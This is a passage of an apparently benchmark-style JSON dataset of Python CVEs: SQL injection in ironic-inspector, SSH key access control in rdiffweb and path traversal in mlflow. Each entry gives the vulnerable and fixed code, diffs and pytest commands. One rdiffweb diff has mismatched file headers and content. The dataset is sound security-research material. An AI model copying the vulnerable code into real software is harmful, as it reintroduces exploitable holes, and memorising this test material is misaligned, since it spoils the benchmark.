        "snippet": "def find_node(**attributes):\n    \"\"\"Find node in cache.\n\n    Looks up a node based on attributes in a best-match fashion.\n    This function acquires a lock on a node.\n\n    :param attributes: attributes known about this node (like macs, BMC etc)\n                       also ironic client instance may be passed under 'ironic'\n    :returns: structure NodeInfo with attributes ``uuid`` and ``created_at``\n    :raises: Error if node is not found or multiple nodes match the attributes\n    \"\"\"\n    ironic = attributes.pop('ironic', None)\n    # NOTE(dtantsur): sorting is not required, but gives us predictability\n    found = collections.Counter()\n\n    for (name, value) in sorted(attributes.items()):\n        if not value:\n            LOG.debug('Empty value for attribute %s', name)\n            continue\n        if not isinstance(value, list):\n            value = [value]\n\n        LOG.debug('Trying to use %s of value %s for node look up',\n                  name, value)\n        query = db.model_query(db.Attribute.node_uuid)\n        pairs = [(db.Attribute.name == name) &\n                 (db.Attribute.value == v) for v in value]\n        query = query.filter(six.moves.reduce(operator.or_, pairs))\n        found.update(row.node_uuid for row in query.distinct().all())\n\n    if not found:\n        raise utils.NotFoundInCacheError(_(\n            'Could not find a node for attributes %s') % attributes)\n\n    most_common = found.most_common()\n    LOG.debug('The following nodes match the attributes: %(attributes)s, '\n              'scoring: %(most_common)s',\n              {'most_common': ', '.join('%s: %d' % tpl for tpl in most_common),\n               'attributes': ', '.join('%s=%s' % tpl for tpl in\n                                       attributes.items())})\n\n    # NOTE(milan) most_common is sorted, higher scores first\n    highest_score = most_common[0][1]\n    found = [item[0] for item in most_common if highest_score == item[1]]\n    if len(found) > 1:\n        raise utils.Error(_(\n            'Multiple nodes match the same number of attributes '\n            '%(attr)s: %(found)s')\n            % {'attr': attributes, 'found': found}, code=404)\n\n    uuid = found.pop()\n    node_info = NodeInfo(uuid=uuid, ironic=ironic)\n    node_info.acquire_lock()\n\n    try:\n        row = (db.model_query(db.Node.started_at, db.Node.finished_at).\n               filter_by(uuid=uuid).first())\n\n        if not row:\n            raise utils.Error(_(\n                'Could not find node %s in introspection cache, '\n                'probably it\\'s not on introspection now') % uuid, code=404)\n\n        if row.finished_at:\n            raise utils.Error(_(\n                'Introspection for node %(node)s already finished on '\n                '%(finish)s') % {'node': uuid, 'finish': row.finished_at})\n\n        node_info.started_at = row.started_at\n        return node_info\n    except Exception:\n        with excutils.save_and_reraise_exception():\n            node_info.release_lock()"
      }
    ],
    "vul_patch": "--- a/ironic_inspector/node_cache.py\n+++ b/ironic_inspector/node_cache.py\n@@ -22,14 +22,11 @@\n \n         LOG.debug('Trying to use %s of value %s for node look up',\n                   name, value)\n-        value_list = []\n-        for v in value:\n-            value_list.append(\"name='%s' AND value='%s'\" % (name, v))\n-        stmt = ('select distinct node_uuid from attributes where ' +\n-                ' OR '.join(value_list))\n-        rows = (db.model_query(db.Attribute.node_uuid).from_statement(\n-            text(stmt)).all())\n-        found.update(row.node_uuid for row in rows)\n+        query = db.model_query(db.Attribute.node_uuid)\n+        pairs = [(db.Attribute.name == name) &\n+                 (db.Attribute.value == v) for v in value]\n+        query = query.filter(six.moves.reduce(operator.or_, pairs))\n+        found.update(row.node_uuid for row in query.distinct().all())\n \n     if not found:\n         raise utils.NotFoundInCacheError(_(\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-4724",
    "cve_description": "Improper Access Control in GitHub repository ikus060/rdiffweb prior to 2.5.5.",
    "cwe_info": {
      "CWE-284": {
        "name": "Improper Access Control",
        "description": "The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor."
      }
    },
    "repo": "https://github.com/ikus060/rdiffweb",
    "patch_url": [
      "https://github.com/ikus060/rdiffweb/commit/c4a19cf67d575c4886171b8efcbf4675d51f3929"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_54_1",
        "commit": "d1aaa96",
        "file_path": "rdiffweb/core/model/__init__.py",
        "start_line": 70,
        "end_line": 139,
        "snippet": "@event.listens_for(Base.metadata, 'after_create')\ndef db_after_create(target, connection, **kw):\n    \"\"\"\n    Called on database creation to update database schema.\n    \"\"\"\n\n    if getattr(connection, '_transaction', None):\n        connection._transaction.commit()\n\n    # Add repo's Encoding\n    _column_add(connection, RepoObject.__table__.c.Encoding)\n    _column_add(connection, RepoObject.__table__.c.keepdays)\n\n    # Create column for roles using \"isadmin\" column. Keep the\n    # original column in case we need to revert to previous version.\n    if not _column_exists(connection, UserObject.__table__.c.role):\n        _column_add(connection, UserObject.__table__.c.role)\n        UserObject.query.filter(UserObject._is_admin == 1).update({UserObject.role: UserObject.ADMIN_ROLE})\n\n    # Add user's fullname column\n    _column_add(connection, UserObject.__table__.c.fullname)\n\n    # Add user's mfa column\n    _column_add(connection, UserObject.__table__.c.mfa)\n\n    # Re-create session table if Number column is missing\n    if not _column_exists(connection, SessionObject.__table__.c.Number):\n        SessionObject.__table__.drop()\n        SessionObject.__table__.create()\n\n    if getattr(connection, '_transaction', None):\n        connection._transaction.commit()\n\n    # Remove preceding and leading slash (/) generated by previous\n    # versions. Also rename '.' to ''\n    result = RepoObject.query.all()\n    for row in result:\n        if row.repopath.startswith('/') or row.repopath.endswith('/'):\n            row.repopath = row.repopath.strip('/')\n            row.commit()\n        if row.repopath == '.':\n            row.repopath = ''\n            row.commit()\n    # Remove duplicates and nested repositories.\n    result = RepoObject.query.order_by(RepoObject.userid, RepoObject.repopath).all()\n    prev_repo = (None, None)\n    for row in result:\n        if prev_repo[0] == row.userid and (prev_repo[1] == row.repopath or row.repopath.startswith(prev_repo[1] + '/')):\n            row.delete()\n        else:\n            prev_repo = (row.userid, row.repopath)\n\n    # Fix username case insensitive unique\n    if not _index_exists(connection, 'user_username_index'):\n        duplicate_users = (\n            UserObject.query.with_entities(func.lower(UserObject.username))\n            .group_by(func.lower(UserObject.username))\n            .having(func.count(UserObject.username) > 1)\n        ).all()\n        try:\n            user_username_index.create()\n        except IntegrityError:\n            msg = (\n                'Failure to upgrade your database to make Username case insensitive. '\n                'You must downgrade and deleted duplicate Username. '\n                '%s' % '\\n'.join([str(k) for k in duplicate_users]),\n            )\n            logger.error(msg)\n            print(msg, file=sys.stderr)\n            raise SystemExit(12)"
      },
      {
        "id": "vul_py_54_2",
        "commit": "d1aaa96",
        "file_path": "rdiffweb/core/model/_user.py",
        "start_line": 153,
        "end_line": 185,
        "snippet": "    def add_authorizedkey(self, key, comment=None):\n        \"\"\"\n        Add the given key to the user. Adding the key to his `authorized_keys`\n        file if it exists and adding it to database.\n        \"\"\"\n        # Parse and validate ssh key\n        assert key\n        key = authorizedkeys.check_publickey(key)\n\n        # Remove option, replace comments.\n        key = authorizedkeys.AuthorizedKey(\n            options=None, keytype=key.keytype, key=key.key, comment=comment or key.comment\n        )\n\n        # If a filename exists, use it by default.\n        filename = os.path.join(self.user_root, '.ssh', 'authorized_keys')\n        if os.path.isfile(filename):\n            with open(filename, mode=\"r+\", encoding='utf-8') as fh:\n                if authorizedkeys.exists(fh, key):\n                    raise DuplicateSSHKeyError(_(\"SSH key already exists\"))\n                logger.info(\"add key [%s] to [%s] authorized_keys\", key, self.username)\n                authorizedkeys.add(fh, key)\n        else:\n            # Also look in database.\n            logger.info(\"add key [%s] to [%s] database\", key, self.username)\n            try:\n                SshKey(userid=self.userid, fingerprint=key.fingerprint, key=key.getvalue()).add().flush()\n            except IntegrityError:\n                raise DuplicateSSHKeyError(\n                    _(\"Duplicate key. This key already exists or is associated to another user.\")\n                )\n        cherrypy.engine.publish('user_attr_changed', self, {'authorizedkeys': True})\n        cherrypy.engine.publish('authorizedkey_added', self, fingerprint=key.fingerprint, comment=comment)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_54_1",
        "commit": "c4a19cf",
        "file_path": "rdiffweb/core/model/__init__.py",
        "start_line": 71,
        "end_line": 158,
        "snippet": "def db_after_create(target, connection, **kw):\n    \"\"\"\n    Called on database creation to update database schema.\n    \"\"\"\n\n    if getattr(connection, '_transaction', None):\n        connection._transaction.commit()\n\n    # Add repo's Encoding\n    _column_add(connection, RepoObject.__table__.c.Encoding)\n    _column_add(connection, RepoObject.__table__.c.keepdays)\n\n    # Create column for roles using \"isadmin\" column. Keep the\n    # original column in case we need to revert to previous version.\n    if not _column_exists(connection, UserObject.__table__.c.role):\n        _column_add(connection, UserObject.__table__.c.role)\n        UserObject.query.filter(UserObject._is_admin == 1).update({UserObject.role: UserObject.ADMIN_ROLE})\n\n    # Add user's fullname column\n    _column_add(connection, UserObject.__table__.c.fullname)\n\n    # Add user's mfa column\n    _column_add(connection, UserObject.__table__.c.mfa)\n\n    # Re-create session table if Number column is missing\n    if not _column_exists(connection, SessionObject.__table__.c.Number):\n        SessionObject.__table__.drop()\n        SessionObject.__table__.create()\n\n    if getattr(connection, '_transaction', None):\n        connection._transaction.commit()\n\n    # Remove preceding and leading slash (/) generated by previous\n    # versions. Also rename '.' to ''\n    result = RepoObject.query.all()\n    for row in result:\n        if row.repopath.startswith('/') or row.repopath.endswith('/'):\n            row.repopath = row.repopath.strip('/')\n            row.commit()\n        if row.repopath == '.':\n            row.repopath = ''\n            row.commit()\n    # Remove duplicates and nested repositories.\n    result = RepoObject.query.order_by(RepoObject.userid, RepoObject.repopath).all()\n    prev_repo = (None, None)\n    for row in result:\n        if prev_repo[0] == row.userid and (prev_repo[1] == row.repopath or row.repopath.startswith(prev_repo[1] + '/')):\n            row.delete()\n        else:\n            prev_repo = (row.userid, row.repopath)\n\n    # Fix username case insensitive unique\n    if not _index_exists(connection, 'user_username_index'):\n        duplicate_users = (\n            UserObject.query.with_entities(func.lower(UserObject.username))\n            .group_by(func.lower(UserObject.username))\n            .having(func.count(UserObject.username) > 1)\n        ).all()\n        try:\n            user_username_index.create()\n        except IntegrityError:\n            msg = (\n                'Failure to upgrade your database to make Username case insensitive. '\n                'You must downgrade and deleted duplicate Username. '\n                '%s' % '\\n'.join([str(k) for k in duplicate_users]),\n            )\n            logger.error(msg)\n            print(msg, file=sys.stderr)\n            raise SystemExit(12)\n\n    # Fix SSH Key uniqueness - since 2.5.4\n    if not _index_exists(connection, 'sshkey_fingerprint_index'):\n        duplicate_sshkeys = (\n            SshKey.query.with_entities(SshKey.fingerprint)\n            .group_by(SshKey.fingerprint)\n            .having(func.count(SshKey.fingerprint) > 1)\n        ).all()\n        try:\n            sshkey_fingerprint_index.create()\n        except IntegrityError:\n            msg = (\n                'Failure to upgrade your database to make SSH Keys unique. '\n                'You must downgrade and deleted duplicate SSH Keys. '\n                '%s' % '\\n'.join([str(k) for k in duplicate_sshkeys]),\n            )\n            logger.error(msg)\n            print(msg, file=sys.stderr)\n            raise SystemExit(12)"
      },
      {
        "id": "fix_py_54_2",
        "commit": "c4a19cf",
        "file_path": "rdiffweb/core/model/_sshkey.py",
        "start_line": 24,
        "end_line": 33,
        "snippet": "class SshKey(Base):\n    __tablename__ = 'sshkeys'\n    __table_args__ = {'sqlite_autoincrement': True}\n    fingerprint = Column('Fingerprint', Text)\n    key = Column('Key', Text, unique=True, primary_key=True)\n    userid = Column('UserID', Integer, nullable=False)\n\n\n# Make finger print unique\nsshkey_fingerprint_index = Index('sshkey_fingerprint_index', SshKey.fingerprint, unique=True)"
      },
      {
        "id": "fix_py_54_3",
        "commit": "c4a19cf",
        "file_path": "rdiffweb/core/model/_user.py",
        "start_line": 153,
        "end_line": 186,
        "snippet": "    def add_authorizedkey(self, key, comment=None):\n        \"\"\"\n        Add the given key to the user. Adding the key to his `authorized_keys`\n        file if it exists and adding it to database.\n        \"\"\"\n        # Parse and validate ssh key\n        assert key\n        key = authorizedkeys.check_publickey(key)\n\n        # Remove option & Remove comment for SQL storage\n        key = authorizedkeys.AuthorizedKey(\n            options=None, keytype=key.keytype, key=key.key, comment=comment or key.comment\n        )\n\n        # If a filename exists, use it by default.\n        filename = os.path.join(self.user_root, '.ssh', 'authorized_keys')\n        if os.path.isfile(filename):\n            with open(filename, mode=\"r+\", encoding='utf-8') as fh:\n                if authorizedkeys.exists(fh, key):\n                    raise DuplicateSSHKeyError(_(\"SSH key already exists\"))\n                logger.info(\"add key [%s] to [%s] authorized_keys\", key, self.username)\n                authorizedkeys.add(fh, key)\n        else:\n            # Also look in database.\n            logger.info(\"add key [%s] to [%s] database\", key, self.username)\n            try:\n                sshkey = SshKey(userid=self.userid, fingerprint=key.fingerprint, key=key.getvalue())\n                sshkey.add().flush()\n            except IntegrityError:\n                raise DuplicateSSHKeyError(\n                    _(\"Duplicate key. This key already exists or is associated to another user.\")\n                )\n        cherrypy.engine.publish('user_attr_changed', self, {'authorizedkeys': True})\n        cherrypy.engine.publish('authorizedkey_added', self, fingerprint=key.fingerprint, comment=comment)"
      }
    ],
    "vul_patch": "--- a/rdiffweb/core/model/__init__.py\n+++ b/rdiffweb/core/model/__init__.py\n@@ -1,4 +1,3 @@\n-@event.listens_for(Base.metadata, 'after_create')\n def db_after_create(target, connection, **kw):\n     \"\"\"\n     Called on database creation to update database schema.\n@@ -68,3 +67,22 @@\n             logger.error(msg)\n             print(msg, file=sys.stderr)\n             raise SystemExit(12)\n+\n+    # Fix SSH Key uniqueness - since 2.5.4\n+    if not _index_exists(connection, 'sshkey_fingerprint_index'):\n+        duplicate_sshkeys = (\n+            SshKey.query.with_entities(SshKey.fingerprint)\n+            .group_by(SshKey.fingerprint)\n+            .having(func.count(SshKey.fingerprint) > 1)\n+        ).all()\n+        try:\n+            sshkey_fingerprint_index.create()\n+        except IntegrityError:\n+            msg = (\n+                'Failure to upgrade your database to make SSH Keys unique. '\n+                'You must downgrade and deleted duplicate SSH Keys. '\n+                '%s' % '\\n'.join([str(k) for k in duplicate_sshkeys]),\n+            )\n+            logger.error(msg)\n+            print(msg, file=sys.stderr)\n+            raise SystemExit(12)\n\n--- a/rdiffweb/core/model/_user.py\n+++ b/rdiffweb/core/model/_sshkey.py\n@@ -1,33 +1,10 @@\n-    def add_authorizedkey(self, key, comment=None):\n-        \"\"\"\n-        Add the given key to the user. Adding the key to his `authorized_keys`\n-        file if it exists and adding it to database.\n-        \"\"\"\n-        # Parse and validate ssh key\n-        assert key\n-        key = authorizedkeys.check_publickey(key)\n+class SshKey(Base):\n+    __tablename__ = 'sshkeys'\n+    __table_args__ = {'sqlite_autoincrement': True}\n+    fingerprint = Column('Fingerprint', Text)\n+    key = Column('Key', Text, unique=True, primary_key=True)\n+    userid = Column('UserID', Integer, nullable=False)\n \n-        # Remove option, replace comments.\n-        key = authorizedkeys.AuthorizedKey(\n-            options=None, keytype=key.keytype, key=key.key, comment=comment or key.comment\n-        )\n \n-        # If a filename exists, use it by default.\n-        filename = os.path.join(self.user_root, '.ssh', 'authorized_keys')\n-        if os.path.isfile(filename):\n-            with open(filename, mode=\"r+\", encoding='utf-8') as fh:\n-                if authorizedkeys.exists(fh, key):\n-                    raise DuplicateSSHKeyError(_(\"SSH key already exists\"))\n-                logger.info(\"add key [%s] to [%s] authorized_keys\", key, self.username)\n-                authorizedkeys.add(fh, key)\n-        else:\n-            # Also look in database.\n-            logger.info(\"add key [%s] to [%s] database\", key, self.username)\n-            try:\n-                SshKey(userid=self.userid, fingerprint=key.fingerprint, key=key.getvalue()).add().flush()\n-            except IntegrityError:\n-                raise DuplicateSSHKeyError(\n-                    _(\"Duplicate key. This key already exists or is associated to another user.\")\n-                )\n-        cherrypy.engine.publish('user_attr_changed', self, {'authorizedkeys': True})\n-        cherrypy.engine.publish('authorizedkey_added', self, fingerprint=key.fingerprint, comment=comment)\n+# Make finger print unique\n+sshkey_fingerprint_index = Index('sshkey_fingerprint_index', SshKey.fingerprint, unique=True)\n\n--- /dev/null\n+++ b/rdiffweb/core/model/_sshkey.py\n@@ -0,0 +1,34 @@\n+    def add_authorizedkey(self, key, comment=None):\n+        \"\"\"\n+        Add the given key to the user. Adding the key to his `authorized_keys`\n+        file if it exists and adding it to database.\n+        \"\"\"\n+        # Parse and validate ssh key\n+        assert key\n+        key = authorizedkeys.check_publickey(key)\n+\n+        # Remove option & Remove comment for SQL storage\n+        key = authorizedkeys.AuthorizedKey(\n+            options=None, keytype=key.keytype, key=key.key, comment=comment or key.comment\n+        )\n+\n+        # If a filename exists, use it by default.\n+        filename = os.path.join(self.user_root, '.ssh', 'authorized_keys')\n+        if os.path.isfile(filename):\n+            with open(filename, mode=\"r+\", encoding='utf-8') as fh:\n+                if authorizedkeys.exists(fh, key):\n+                    raise DuplicateSSHKeyError(_(\"SSH key already exists\"))\n+                logger.info(\"add key [%s] to [%s] authorized_keys\", key, self.username)\n+                authorizedkeys.add(fh, key)\n+        else:\n+            # Also look in database.\n+            logger.info(\"add key [%s] to [%s] database\", key, self.username)\n+            try:\n+                sshkey = SshKey(userid=self.userid, fingerprint=key.fingerprint, key=key.getvalue())\n+                sshkey.add().flush()\n+            except IntegrityError:\n+                raise DuplicateSSHKeyError(\n+                    _(\"Duplicate key. This key already exists or is associated to another user.\")\n+                )\n+        cherrypy.engine.publish('user_attr_changed', self, {'authorizedkeys': True})\n+        cherrypy.engine.publish('authorizedkey_added', self, fingerprint=key.fingerprint, comment=comment)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-4724:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/rdiffweb\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-4724/bin/python -m pytest rdiffweb/core/model/tests/test_user.py -k \"test_add_authorizedkey_duplicate\" -p no:warning --disable-warnings --import-mode=importlib\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-4724:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/rdiffweb\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-4724/bin/python -m pytest rdiffweb/core/model/tests/test_user.py  -p no:warning --disable-warnings --import-mode=importlib\n"
  },
  {
    "cve_id": "CVE-2023-30172",
    "cve_description": "A directory traversal vulnerability in the /get-artifact API method of the mlflow platform up to v2.0.1 allows attackers to read arbitrary files on the server via the path parameter.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/ac4b697bb0bb8a331944dca63f4235b4bf602ab8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_30_1",
        "commit": "d1c7621",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 528,
        "end_line": 546,
        "snippet": "def get_artifact_handler():\n    from querystring_parser import parser\n\n    query_string = request.query_string.decode(\"utf-8\")\n    request_dict = parser.parse(query_string, normalized=True)\n    run_id = request_dict.get(\"run_id\") or request_dict.get(\"run_uuid\")\n    run = _get_tracking_store().get_run(run_id)\n\n    if _is_servable_proxied_run_artifact_root(run.info.artifact_uri):\n        artifact_repo = _get_artifact_repo_mlflow_artifacts()\n        artifact_path = _get_proxied_run_artifact_destination_path(\n            proxied_artifact_root=run.info.artifact_uri,\n            relative_path=request_dict[\"path\"],\n        )\n    else:\n        artifact_repo = _get_artifact_repo(run)\n        artifact_path = request_dict[\"path\"]\n\n    return _send_artifact(artifact_repo, artifact_path)"
      },
      {
        "id": "vul_py_30_2",
        "commit": "d1c7621",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 887,
        "end_line": 916,
        "snippet": "def _list_artifacts():\n    request_message = _get_request_message(\n        ListArtifacts(),\n        schema={\n            \"run_id\": [_assert_string, _assert_required],\n            \"path\": [_assert_string],\n            \"page_token\": [_assert_string],\n        },\n    )\n    response_message = ListArtifacts.Response()\n    if request_message.HasField(\"path\"):\n        path = request_message.path\n    else:\n        path = None\n    run_id = request_message.run_id or request_message.run_uuid\n    run = _get_tracking_store().get_run(run_id)\n\n    if _is_servable_proxied_run_artifact_root(run.info.artifact_uri):\n        artifact_entities = _list_artifacts_for_proxied_run_artifact_root(\n            proxied_artifact_root=run.info.artifact_uri,\n            relative_path=path,\n        )\n    else:\n        artifact_entities = _get_artifact_repo(run).list_artifacts(path)\n\n    response_message.files.extend([a.to_proto() for a in artifact_entities])\n    response_message.root_uri = run.info.artifact_uri\n    response = Response(mimetype=\"application/json\")\n    response.set_data(message_to_json(response_message))\n    return response"
      },
      {
        "id": "vul_py_30_3",
        "commit": "d1c7621",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 1269,
        "end_line": 1288,
        "snippet": "def get_model_version_artifact_handler():\n    from querystring_parser import parser\n\n    query_string = request.query_string.decode(\"utf-8\")\n    request_dict = parser.parse(query_string, normalized=True)\n    name = request_dict.get(\"name\")\n    version = request_dict.get(\"version\")\n    artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)\n\n    if _is_servable_proxied_run_artifact_root(artifact_uri):\n        artifact_repo = _get_artifact_repo_mlflow_artifacts()\n        artifact_path = _get_proxied_run_artifact_destination_path(\n            proxied_artifact_root=artifact_uri,\n            relative_path=request_dict[\"path\"],\n        )\n    else:\n        artifact_repo = get_artifact_repository(artifact_uri)\n        artifact_path = request_dict[\"path\"]\n\n    return _send_artifact(artifact_repo, artifact_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_30_1",
        "commit": "ac4b697",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 548,
        "end_line": 568,
        "snippet": "def get_artifact_handler():\n    from querystring_parser import parser\n\n    query_string = request.query_string.decode(\"utf-8\")\n    request_dict = parser.parse(query_string, normalized=True)\n    run_id = request_dict.get(\"run_id\") or request_dict.get(\"run_uuid\")\n    path = request_dict[\"path\"]\n    validate_path_is_safe(path)\n    run = _get_tracking_store().get_run(run_id)\n\n    if _is_servable_proxied_run_artifact_root(run.info.artifact_uri):\n        artifact_repo = _get_artifact_repo_mlflow_artifacts()\n        artifact_path = _get_proxied_run_artifact_destination_path(\n            proxied_artifact_root=run.info.artifact_uri,\n            relative_path=path,\n        )\n    else:\n        artifact_repo = _get_artifact_repo(run)\n        artifact_path = path\n\n    return _send_artifact(artifact_repo, artifact_path)"
      },
      {
        "id": "fix_py_30_2",
        "commit": "ac4b697",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 909,
        "end_line": 939,
        "snippet": "def _list_artifacts():\n    request_message = _get_request_message(\n        ListArtifacts(),\n        schema={\n            \"run_id\": [_assert_string, _assert_required],\n            \"path\": [_assert_string],\n            \"page_token\": [_assert_string],\n        },\n    )\n    response_message = ListArtifacts.Response()\n    if request_message.HasField(\"path\"):\n        path = request_message.path\n        validate_path_is_safe(path)\n    else:\n        path = None\n    run_id = request_message.run_id or request_message.run_uuid\n    run = _get_tracking_store().get_run(run_id)\n\n    if _is_servable_proxied_run_artifact_root(run.info.artifact_uri):\n        artifact_entities = _list_artifacts_for_proxied_run_artifact_root(\n            proxied_artifact_root=run.info.artifact_uri,\n            relative_path=path,\n        )\n    else:\n        artifact_entities = _get_artifact_repo(run).list_artifacts(path)\n\n    response_message.files.extend([a.to_proto() for a in artifact_entities])\n    response_message.root_uri = run.info.artifact_uri\n    response = Response(mimetype=\"application/json\")\n    response.set_data(message_to_json(response_message))\n    return response"
      },
      {
        "id": "fix_py_30_3",
        "commit": "ac4b697",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 1292,
        "end_line": 1312,
        "snippet": "def get_model_version_artifact_handler():\n    from querystring_parser import parser\n\n    query_string = request.query_string.decode(\"utf-8\")\n    request_dict = parser.parse(query_string, normalized=True)\n    name = request_dict.get(\"name\")\n    version = request_dict.get(\"version\")\n    path = request_dict[\"path\"]\n    validate_path_is_safe(path)\n    artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)\n    if _is_servable_proxied_run_artifact_root(artifact_uri):\n        artifact_repo = _get_artifact_repo_mlflow_artifacts()\n        artifact_path = _get_proxied_run_artifact_destination_path(\n            proxied_artifact_root=artifact_uri,\n            relative_path=path,\n        )\n    else:\n        artifact_repo = get_artifact_repository(artifact_uri)\n        artifact_path = path\n\n    return _send_artifact(artifact_repo, artifact_path)"
      },
      {
        "id": "fix_py_30_4",
        "commit": "ac4b697",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 530,
        "end_line": 544,
        "snippet": "def validate_path_is_safe(path):\n    \"\"\"\n    Validates that the specified path is safe to join with a trusted prefix. This is a security\n    measure to prevent path traversal attacks. The implementation is based on\n    `werkzeug.security.safe_join` (https://github.com/pallets/werkzeug/blob/a3005e6acda7246fe0a684c71921bf4882b4ba1c/src/werkzeug/security.py#L110).\n    \"\"\"\n    if path != \"\":\n        path = posixpath.normpath(path)\n    if (\n        any(sep in path for sep in _os_alt_seps)\n        or os.path.isabs(path)\n        or path == \"..\"\n        or path.startswith(\"../\")\n    ):\n        raise MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)"
      },
      {
        "id": "fix_py_30_5",
        "commit": "ac4b697",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 527,
        "end_line": 527,
        "snippet": "_os_alt_seps = list(sep for sep in [os.sep, os.path.altsep] if sep is not None and sep != \"/\")"
      }
    ],
    "vul_patch": "--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -4,16 +4,18 @@\n     query_string = request.query_string.decode(\"utf-8\")\n     request_dict = parser.parse(query_string, normalized=True)\n     run_id = request_dict.get(\"run_id\") or request_dict.get(\"run_uuid\")\n+    path = request_dict[\"path\"]\n+    validate_path_is_safe(path)\n     run = _get_tracking_store().get_run(run_id)\n \n     if _is_servable_proxied_run_artifact_root(run.info.artifact_uri):\n         artifact_repo = _get_artifact_repo_mlflow_artifacts()\n         artifact_path = _get_proxied_run_artifact_destination_path(\n             proxied_artifact_root=run.info.artifact_uri,\n-            relative_path=request_dict[\"path\"],\n+            relative_path=path,\n         )\n     else:\n         artifact_repo = _get_artifact_repo(run)\n-        artifact_path = request_dict[\"path\"]\n+        artifact_path = path\n \n     return _send_artifact(artifact_repo, artifact_path)\n\n--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -10,6 +10,7 @@\n     response_message = ListArtifacts.Response()\n     if request_message.HasField(\"path\"):\n         path = request_message.path\n+        validate_path_is_safe(path)\n     else:\n         path = None\n     run_id = request_message.run_id or request_message.run_uuid\n\n--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -5,16 +5,17 @@\n     request_dict = parser.parse(query_string, normalized=True)\n     name = request_dict.get(\"name\")\n     version = request_dict.get(\"version\")\n+    path = request_dict[\"path\"]\n+    validate_path_is_safe(path)\n     artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)\n-\n     if _is_servable_proxied_run_artifact_root(artifact_uri):\n         artifact_repo = _get_artifact_repo_mlflow_artifacts()\n         artifact_path = _get_proxied_run_artifact_destination_path(\n             proxied_artifact_root=artifact_uri,\n-            relative_path=request_dict[\"path\"],\n+            relative_path=path,\n         )\n     else:\n         artifact_repo = get_artifact_repository(artifact_uri)\n-        artifact_path = request_dict[\"path\"]\n+        artifact_path = path\n \n     return _send_artifact(artifact_repo, artifact_path)\n\n--- /dev/null\n+++ b/mlflow/server/handlers.py\n@@ -0,0 +1,15 @@\n+def validate_path_is_safe(path):\n+    \"\"\"\n+    Validates that the specified path is safe to join with a trusted prefix. This is a security\n+    measure to prevent path traversal attacks. The implementation is based on\n+    `werkzeug.security.safe_join` (https://github.com/pallets/werkzeug/blob/a3005e6acda7246fe0a684c71921bf4882b4ba1c/src/werkzeug/security.py#L110).\n+    \"\"\"\n+    if path != \"\":\n+        path = posixpath.normpath(path)\n+    if (\n+        any(sep in path for sep in _os_alt_seps)\n+        or os.path.isabs(path)\n+        or path == \"..\"\n+        or path.startswith(\"../\")\n+    ):\n+        raise MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)\n\n--- /dev/null\n+++ b/mlflow/server/handlers.py\n@@ -0,0 +1 @@\n+_os_alt_seps = list(sep for sep in [os.sep, os.path.altsep] if sep is not None and sep != \"/\")\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-30172:latest\n# bash /workspace/fix-run.sh\nset -e\nexport PATH=\"/workspace/PoC_env/CVE-2023-30172/bin:$PATH\"\ncd /workspace/mlflow\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-30172/bin/python -m pytest tests/tracking/test_rest_tracking.py::test_path_validation tests/tracking/test_rest_tracking.py::test_validate_path_is_safe_good tests/tracking/test_rest_tracking.py::test_validate_path_is_safe_bad\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-30172:latest\n# bash /workspace/unit_test.sh\nset -e\nexport PATH=\"/workspace/PoC_env/CVE-2023-30172/bin:$PATH\"\ncd /workspace/mlflow\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-30172/bin/python -m pytest tests/tracking/test_rest_tracking.py -k \"not test_log_model[file] and not test_log_model[sqlalchemy] and not test_artifacts[file] and not test_artifacts[sqlalchemy]\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2022-31040",
